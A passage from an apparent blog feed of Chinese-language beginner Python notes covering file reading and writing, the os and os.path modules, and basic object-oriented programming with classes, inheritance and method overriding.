只读，文件指针在文件开头</li><li>w 只写，文件不存在则创建，存在则覆盖原内容，文件指针在文件开头</li><li>a 追加，文本不在则创建，存在则在原内容后追加内容，文件指针在文件末尾</li><li>b 以二进制方式打开文件，不可单独使用</li><li><code>+</code> 读写，不可单独使用</li></ul><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">'b.txt'</span>,<span class="hljs-string">'w'</span>)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(<span class="hljs-string">'Python'</span>)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></tbody></table></figure><p>创建了b.txt，内容为：Python</p><p>eg:</p><p>在根目录下添加图片：logo.png</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">src_file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'logo.png'</span>,<span class="hljs-string">'rb'</span>)<span class="hljs-comment">#打开logo.png,只读</span><br>target_file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'copylogo.png'</span>,<span class="hljs-string">'wb'</span>)<span class="hljs-comment">#创建copylogo.png</span><br>target_file.<span class="hljs-built_in">write</span>(src_file.<span class="hljs-built_in">read</span>())<span class="hljs-comment">#读取的logo.png内容写到copylogo.png中</span><br>target_file.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#释放资源</span><br>src_file.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#释放资源</span><br></code></pre></td></tr></tbody></table></figure><h2 id="文件对象的常用方法"><a href="#文件对象的常用方法" class="headerlink" title="文件对象的常用方法"></a>文件对象的常用方法</h2><ul><li>read([size]) 从文件中读size个字节或字符内容，返回略。若无size值则读取全部</li><li>readline() 读一行</li><li>readlines() 读每一行，单独成对象放入列表中</li><li>write(str) 将str写入文件</li><li>writelines(s_list) 将列表s_list写入文件，不加换行符</li><li>seek(offest[where])</li><li>tell() 返回文件指针当前位置</li><li>flush() 缓冲区内容写入文件，但不关闭文件</li><li>close() 缓冲股权内容写入文件，同事关闭文件，释放资源</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'a.txt'</span>,<span class="hljs-string">'r'</span>,encoding=<span class="hljs-string">'utf-8'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read()</span></span>)#中国\n美丽<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read(<span class="hljs-number">2</span>)</span></span>)#中国<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.readline()</span></span>)#中国<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.readlines()</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'中国\n'</span>, <span class="hljs-string">'美丽'</span>]</span><br> <span class="hljs-selector-id">#seek</span> tell writelines<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'c.txt'</span>,<span class="hljs-string">'a'</span>)<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">'hello'</span>)<br>lst=<span class="hljs-selector-attr">[<span class="hljs-string">'java'</span>,<span class="hljs-string">'go'</span>,<span class="hljs-string">'python'</span>]</span><br>file<span class="hljs-selector-class">.writelines</span>(lst)<span class="hljs-selector-id">#hellohellojavagopython</span><br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'c.txt'</span>,<span class="hljs-string">'r'</span>)<br>file<span class="hljs-selector-class">.seek</span>(<span class="hljs-number">2</span>)#从第二个字节开始读<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read()</span></span>)<span class="hljs-selector-id">#llohellojavagopython</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.tell()</span></span>)#<span class="hljs-number">22</span><br> <span class="hljs-selector-id">#flush</span>()<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'d.txt'</span>,<span class="hljs-string">'a'</span>)<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">'hello'</span>)<br>file<span class="hljs-selector-class">.flush</span>()<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">' world'</span>)<span class="hljs-selector-id">#hello</span> world<br>file<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></tbody></table></figure><h2 id="with语句（上下文管理器）"><a href="#with语句（上下文管理器）" class="headerlink" title="with语句（上下文管理器）"></a>with语句（上下文管理器）</h2><p>自动管理上下文资源，确保文件正确关闭释放资源</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'b.txt'</span>,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    print(<span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>())<span class="hljs-comment">#Python</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'logo.png'</span>,<span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> src_file:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'copy2logo.png'</span>,<span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> target_file:<br>        target_file.<span class="hljs-built_in">write</span>(src_file.<span class="hljs-built_in">read</span>())<br></code></pre></td></tr></tbody></table></figure><h1 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h1><p>os模块与操作系统有关</p><p>os模块与os.path模块对目录或文件操作</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> os<br>os.<span class="hljs-keyword">system</span>(<span class="hljs-string">'notepad.exe'</span>)#打开记事本<br>os.<span class="hljs-keyword">system</span>((<span class="hljs-string">'calc.exe'</span>))#打开计算器<br> #直接调用可执行文件<br>os.startfile(<span class="hljs-string">'..\\Tencent\\QQ\\Bin\\QQ.exe'</span>)# 打开QQ<br></code></pre></td></tr></tbody></table></figure><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><ul><li>getcwd() 返回当前工作目录</li><li>listdir(path) 返回指定路径下的文件和目录信息</li><li>mkdir(path [,mode]) 创建目录</li><li>makedirs(path/path1/……） 创建多级目录</li><li>rmdir() 删除目录</li><li>removedirs() 删除多级目录</li><li>chdir() 将path设置为当前工作目录</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import os<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(os.getcwd()</span></span>)<br>lst=os<span class="hljs-selector-class">.listdir</span>(<span class="hljs-string">'../python学习下-面向对象'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst)</span></span><br>os<span class="hljs-selector-class">.mkdir</span>(<span class="hljs-string">'newdir'</span>)<br>os<span class="hljs-selector-class">.makedirs</span>(<span class="hljs-string">'A/B/C'</span>)<br> <span class="hljs-selector-id">#os</span><span class="hljs-selector-class">.rmdir</span>(<span class="hljs-string">'newdir'</span>)<br> <span class="hljs-selector-id">#os</span><span class="hljs-selector-class">.removedirs</span>(<span class="hljs-string">'A/B/C'</span>)<br>os<span class="hljs-selector-class">.chdir</span>(<span class="hljs-string">'..\\python学习下-面向对象'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(os.getcwd()</span></span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="os-path模块相关函数"><a href="#os-path模块相关函数" class="headerlink" title="os.path模块相关函数"></a>os.path模块相关函数</h2><ul><li>abspath(path) 获取绝对路径</li><li>exists() 判断目录是否存在，在True,不在False</li><li>join(path,name) 将目录与目录或文件名拼接起来</li><li>splitext() 分离文件名和扩展名</li><li>basename() 从一个目录中提取文件名</li><li>dirname(path) 从一个路径中提取文件路径，不包括文件名</li><li>isdir(path) 用于判断是否为路径</li></ul><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.abspath(<span class="hljs-string">'demo14.py'</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-string">'demo2.py'</span>)) # True<br><span class="hljs-built_in">print</span>((<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-string">'D:\\'</span>,<span class="hljs-string">'demo14.py'</span>))) #D:\demo14.py<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.split(<span class="hljs-string">'demo14.py'</span>)) #(<span class="hljs-string">''</span>, <span class="hljs-string">'demo14.py'</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.splitext(<span class="hljs-string">'demo14.py'</span>)) #(<span class="hljs-string">'demo14'</span>, <span class="hljs-string">'.py'</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.basename(<span class="hljs-string">'D:\demo14.py'</span>)) #demo14.py<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.dirname(<span class="hljs-string">'D:\demo14.py'</span>)) #D:\<br></code></pre></td></tr></tbody></table></figure><p>eg: 列出指定目录下的所有py文件</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">path</span>=<span class="hljs-built_in">os</span>.getcwd()<br>lst=<span class="hljs-built_in">os</span>.listdir(<span class="hljs-built_in">path</span>)<br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-keyword">if</span> filename.endswith(<span class="hljs-string">'.py'</span>):<br>        <span class="hljs-built_in">print</span>(filename)<br></code></pre></td></tr></tbody></table></figure><p>eg: 目录如下：</p><ul><li>python:<ul><li>demo16.py</li><li>newdir:<ul><li>1.py</li><li>2.py</li><li>sub:<ul><li>sub1.py</li></ul></li></ul></li></ul></li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import os<br><span class="hljs-attribute">path</span>=os.getcwd()<br><span class="hljs-attribute">lst_files</span>=os.walk(path)<br><span class="hljs-keyword">for</span> dirpath,dirname,filename <span class="hljs-keyword">in</span> lst_files:<br>    <span class="hljs-built_in">print</span>(dirpath)<br>    <span class="hljs-built_in">print</span>(dirname)<br>    <span class="hljs-built_in">print</span>(filename)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'-------------'</span>)<br>    <span class="hljs-keyword">for</span> dir <span class="hljs-keyword">in</span> dirname:<br>        <span class="hljs-built_in">print</span>(os.path.join(dirpath,dir))<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> filename:<br>        <span class="hljs-built_in">print</span>(os.path.join(dirpath,file))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'------------------'</span>)<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;模块&quot;&gt;&lt;a href=&quot;#模块&quot; class=&quot;headerlink&quot; title=&quot;模块&quot;&gt;&lt;/a&gt;模块&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;一个模块中可以包含N多个函数&lt;/li&gt;
&lt;li&gt;在python中一个扩展名为.py的文件就是一个模块&lt;/li&gt;
&lt;li&gt;好处：&lt;</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习8</title>
    <link href="https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A08/"/>
    <id>https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A08/</id>
    <published>2022-09-19T11:54:03.008Z</published>
    <updated>2022-09-21T13:44:42.826Z</updated>
    
    <content type="html"><![CDATA[<p>面向对象篇啦！！！！</p><h1 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h1><p>类：多个类似事物组成的群体；数据类型</p><p>对象：100，99是int类下包含的相似不相同个例，称为实例或对象（一切皆对象）</p><h2 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h2><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">Student:</span><br><span class="hljs-symbol">    <span class="hljs-symbol">pass</span></span><br></code></pre></td></tr></tbody></table></figure><p>类的组成：类属性、实例方法、静态方法、类方法</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span><span class="hljs-symbol">:</span><span class="hljs-comment">#Student为类名，由一个或多个单词组成，每个单词首字母大写，其余小写</span><br>    native_pace=<span class="hljs-string">'内蒙'</span><span class="hljs-comment">#直接写在类中的变量成为类属性</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name,age</span>)<span class="hljs-symbol">:</span><span class="hljs-comment">#初始化</span><br>        <span class="hljs-variable language_">self</span>.name=name<span class="hljs-comment">#self.name成为实体属性，进行了赋值操作，将局部变量name值赋给实体属性</span><br>        <span class="hljs-variable language_">self</span>.age=age<br>    <span class="hljs-comment">#实例方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-string">'学生吃饭函数'</span>)<br>    <span class="hljs-comment">#静态方法</span><br>    <span class="hljs-variable">@staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>():<br>        print(<span class="hljs-string">'使用staticmethod进行修饰，为静态方法'</span>)<br>    <span class="hljs-comment">#类方法</span><br>    <span class="hljs-variable">@classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cm</span>(<span class="hljs-params">cls</span>):<br>        print(<span class="hljs-string">'使用classmethod进行修饰，为类方法'</span>)<br> <span class="hljs-comment">#在类之外定义的称为函数，在之内的称为方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drink</span>():<br>    print(<span class="hljs-string">'类之外定义的，是函数'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>又称类的实例化：实例名=类名()</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">stu=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu.name)</span></span>#实例属性<span class="hljs-selector-id">#Jack</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu.age)</span></span>#<span class="hljs-number">20</span><br>stu<span class="hljs-selector-class">.eat</span>()#学生吃饭函数<br>Student<span class="hljs-selector-class">.eat</span>(stu)#学生吃饭函数,二者功能相同<br></code></pre></td></tr></tbody></table></figure><h2 id="类属性，类方法，静态方法"><a href="#类属性，类方法，静态方法" class="headerlink" title="类属性，类方法，静态方法"></a>类属性，类方法，静态方法</h2><p>1.类属性：类中方法外的变量为类属性，被该类所有对象共享</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Student.native_pace)</span></span>#内蒙<br>stu1=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br>stu2=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Rose'</span>,<span class="hljs-number">30</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu1.native_pace)</span></span>#内蒙<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu2.native_pace)</span></span>#内蒙<br>Student.native_pace=<span class="hljs-string">'天津'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu1.native_pace)</span></span>#天津<br></code></pre></td></tr></tbody></table></figure><p>2.类方法：使用<code>@classmethod</code>修饰，用类名直接访问</p><pre><code class="hljs">Student.cm()</code></pre><p>3.静态方法：使用<code>@staticmethod</code>修饰，用类名直接访问</p><pre><code class="hljs">Student.method()</code></pre><p>4.动态绑定属性和方法</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name,age</span>):<br>        <span class="hljs-variable language_">self</span>.name=name<br>        <span class="hljs-variable language_">self</span>.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-variable language_">self</span>.name+<span class="hljs-string">'在吃饭'</span>)<br>stu1=Student(<span class="hljs-string">'张三'</span>,<span class="hljs-number">20</span>)<br>stu2=Student(<span class="hljs-string">'李四'</span>,<span class="hljs-number">30</span>)<br>stu1.gender=<span class="hljs-string">'女'</span><span class="hljs-comment">#动态绑定属性</span><br>print(stu1.name,stu1.age,stu1.gender)<span class="hljs-comment">#张三 20 女</span><br>print(stu2.name,stu2.age)<span class="hljs-comment">#李四 30</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>()<span class="hljs-symbol">:</span><span class="hljs-comment">#动态绑定方法</span><br>    print(<span class="hljs-string">'定义在类之外，称为函数'</span>)<br>stu1.show=show<br>stu1.show()<span class="hljs-comment">#定义在类之外，称为函数</span><br></code></pre></td></tr></tbody></table></figure><h1 id="面向对象三大特征"><a href="#面向对象三大特征" class="headerlink" title="面向对象三大特征"></a>面向对象三大特征</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>提高程序安全性，将数据（属性）和行为（方法）包装到类对象中，在方法内部对属性进行操作，在类对象的为外部调用方法。</p><p>在python表属性私有，不希望属性在类对象外部被调用，前面加两个下划线。</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,brand</span>):<br>        <span class="hljs-variable language_">self</span>.brand=brand<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-string">'汽车已启动'</span>)<br>car=Car(<span class="hljs-string">'宝马X5'</span>)<br>car.start()<span class="hljs-comment">#汽车已启动</span><br>print(car.brand)<span class="hljs-comment">#宝马X5</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.__age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.__age)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br>stu.show()<span class="hljs-comment">#Jack 20</span><br><span class="hljs-built_in">print</span>(stu.name)<span class="hljs-comment">#Jack</span><br> <span class="hljs-comment">#print(stu.__age)#类外不可调用私有</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(stu))<br><span class="hljs-built_in">print</span>(stu._Student__age)<span class="hljs-comment">#在类外可以使用_Student__age访问私有</span><br></code></pre></td></tr></tbody></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>提高的代码复用性</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">class</span> <span class="hljs-constructor">Person(<span class="hljs-params">object</span>)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span>:<br>        self.name=name<br>        self.age=age<br>    def info(self):<br>        print(self.name,self.age)<br><span class="hljs-keyword">class</span> <span class="hljs-constructor">Student(Person)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>,<span class="hljs-params">num</span>)</span>:<br>        super<span class="hljs-literal">()</span>.<span class="hljs-constructor">__init__(<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span><br>        self.num=num<br><span class="hljs-keyword">class</span> <span class="hljs-constructor">Teacher(Person)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>,<span class="hljs-params">tyear</span>)</span>:<br>        super<span class="hljs-literal">()</span>.<span class="hljs-constructor">__init__(<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span><br>        self.tyear=tyear<br>stu=<span class="hljs-constructor">Student('Jack',20,'1001')</span><br>teacher=<span class="hljs-constructor">Teacher('Rose',30,10)</span><br>stu.info<span class="hljs-literal">()</span>#Jack <span class="hljs-number">20</span><br>teacher.info<span class="hljs-literal">()</span>#Rose <span class="hljs-number">30</span><br></code></pre></td></tr></tbody></table></figure><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">A</span>(<span class="hljs-symbol">object</span>):<br>    <span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">B</span>(<span class="hljs-symbol">object</span>):<br>    <span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">C</span>(<span class="hljs-symbol">A,<span class="hljs-symbol">B</span></span>):<br>    <span class="hljs-symbol">pass</span><br></code></pre></td></tr></tbody></table></figure><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>若子类对父类某个属性或方法不满意，可在子类中对其进行重写</p><p>子类重写后的方法可用<code>super().xxx</code>调用父类2中被重写的方法</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.age)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age,num</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name,age)<br>        self.num=num<br>    <span class="hljs-comment">#方法重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().info()<br>        <span class="hljs-built_in">print</span>(self.num)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age,tyear</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name,age)<br>        self.tyear=tyear<br>    <span class="hljs-comment">#方法重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().info()<br>        <span class="hljs-built_in">print</span>(self.tyear)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>,<span class="hljs-string">'1001'</span>)<br>teacher=Teacher(<span class="hljs-string">'Rose'</span>,<span class="hljs-number">30</span>,<span class="hljs-number">10</span>)<br>stu.info()<span class="hljs-comment">#Jack 20 1001</span><br>teacher.info()<span class="hljs-comment">#Rose 30  10</span><br></code></pre></td></tr></tbody></table></figure><h3 id="object类"><a href="#object类" class="headerlink" 